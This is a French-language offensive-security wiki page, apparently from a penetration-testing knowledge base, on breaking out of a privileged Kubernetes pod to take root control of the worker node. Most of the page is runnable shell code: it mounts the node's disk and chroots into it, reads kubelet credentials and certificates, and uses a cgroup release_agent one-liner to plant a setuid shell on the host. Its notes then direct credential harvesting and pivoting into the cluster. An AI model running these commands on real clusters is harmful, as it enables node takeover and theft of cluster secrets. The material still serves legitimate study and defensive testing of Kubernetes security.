---
order: 1
title: "Pod privilégié : prise de contrôle du nœud via un security context privilégié"
description: "Un pod dont le conteneur s'exécute avec securityContext.privileged: true reçoit l'ensemble complet des capabilities, tous les périphériques de l'hôte, ainsi qu'un seccomp et un AppArmor non confinés, exactement comme un conteneur privilégié. À partir de là, un attaquant monte le disque racine du nœud ou utilise le release_agent des cgroups pour exécuter du code sur le nœud en root, prenant le contrôle du worker."
keywords:
  - pod privilégié
  - securitycontext
  - prise de contrôle du nœud
  - disque de l'hôte
  - release_agent
---

# Pod privilégié

Un conteneur de pod avec `securityContext.privileged: true` est l'équivalent Kubernetes de `docker run --privileged` : il détient l'ensemble complet des capabilities Linux, peut utiliser tous les périphériques de l'hôte, et s'exécute avec un seccomp et un AppArmor non confinés. Tout ce qui figure sur la page du conteneur privilégié indépendante du runtime s'applique, et l'évasion est la même, aboutissant désormais sur le nœud worker Kubernetes.

Confirmez le privilège et choisissez une voie :

```bash
grep CapEff /proc/self/status                 # full set (…ffffffff) => privileged
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')
ls /dev | grep -E 'sd|nvme|mem'               # host devices visible
```

## Voie : monter le disque du nœud

```bash
fdisk -l 2>/dev/null | grep -E 'Linux|/dev/(sd|nvme|vd)'
mkdir -p /mnt/node && mount /dev/nvme0n1p1 /mnt/node && chroot /mnt/node sh
# node root exposes kubelet creds, static pod manifests, and every pod's secrets
cat /mnt/node/etc/kubernetes/*.conf /mnt/node/var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null
```

## Voie : release_agent des cgroups

Là où monter le disque est malcommode, le one-liner release_agent exécute un payload sur le nœud en root :

```bash
mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c && mkdir /tmp/c/x
echo 1 > /tmp/c/x/notify_on_release
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$host/p" > /tmp/c/release_agent
printf '#!/bin/sh\ncp /bin/bash %s/b; chmod +s %s/b\n' "$host" "$host" > /p && chmod +x /p
sh -c "echo \$\$ > /tmp/c/x/cgroup.procs"
```

Le mécanisme est identique à celui de [release_agent des cgroups](../../../container-escape/privileged-configuration/cgroups-release-agent.md).

## Notes d'exploitation

- Un pod privilégié est par construction une prise de contrôle du nœud ; `cat /proc/self/uid_map` affichant `0 0` confirme le root sur le nœud plutôt qu'une identité remappée.
- Une fois sur le nœud, récoltez les identifiants du kubelet et le token projeté de chaque pod ; voir [Vol d'identifiants du kubelet](kubelet-credential-theft.md), puis pivotez vers le cluster.
- Obtenir un pod privilégié au départ, lorsque vous disposez du RBAC pour créer des pods, relève de [Création de pod vers le nœud](../rbac-privilege-escalation/pod-creation-to-node.md).

## Références

- [BishopFox: bad pods (privileged)](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
- [Kubernetes: security context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Trail of Bits: Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
